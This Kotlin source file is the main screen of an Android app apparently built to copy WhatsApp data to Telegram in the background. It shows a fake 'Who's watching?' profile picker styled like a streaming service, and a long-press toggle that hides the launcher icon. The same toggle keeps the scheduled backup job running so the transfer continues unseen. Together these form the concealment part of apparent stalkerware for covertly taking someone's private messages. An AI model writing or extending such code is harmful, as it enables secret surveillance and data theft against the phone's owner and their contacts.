package com.personal.wabackup.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.LinearLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.personal.wabackup.R
import com.personal.wabackup.util.SettingsStore
import com.personal.wabackup.util.BackupScheduler
import androidx.work.WorkManager

/**
 * Profile selection screen — "Who's watching?"
 * Any profile click navigates to HomeActivity.
 * Long-press on any profile toggles stealth mode (hides the launcher icon;
 * background WhatsApp backup to Telegram keeps running).
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val goHome = { _: Any ->
            startActivity(Intent(this, HomeActivity::class.java))
            // No finish() so back button returns to profile selection
        }

        val p1 = findViewById<LinearLayout>(R.id.profile_1)
        val p2 = findViewById<LinearLayout>(R.id.profile_2)
        val p3 = findViewById<LinearLayout>(R.id.profile_3)
        val p4 = findViewById<LinearLayout>(R.id.profile_4)

        p1.setOnClickListener(goHome)
        p2.setOnClickListener(goHome)
        p3.setOnClickListener(goHome)
        p4.setOnClickListener(goHome)

        p1.setOnLongClickListener { toggleHiddenIcon(); true }
        p2.setOnLongClickListener { toggleHiddenIcon(); true }
        p3.setOnLongClickListener { toggleHiddenIcon(); true }
        p4.setOnLongClickListener { toggleHiddenIcon(); true }
    }

    /** Hide/show the launcher icon without touching backup logic or UI design. */
    private fun toggleHiddenIcon() {
        val settings = SettingsStore(this)
        val newState = !settings.hidden
        val alias = ComponentName(this, "com.personal.wabackup.ui.AliasLauncher")
        val state = if (newState)
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        else
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        packageManager.setComponentEnabledSetting(
            alias, state, PackageManager.DONT_KILL_APP
        )
        settings.hidden = newState
        // Keep the periodic backup job armed even while the icon is hidden.
        if (newState) BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
        Toast.makeText(
            this,
            if (newState) "Icon hidden. Backups continue in background."
            else "Icon restored.",
            Toast.LENGTH_LONG
        ).show()
        if (newState) finish()
    }
}
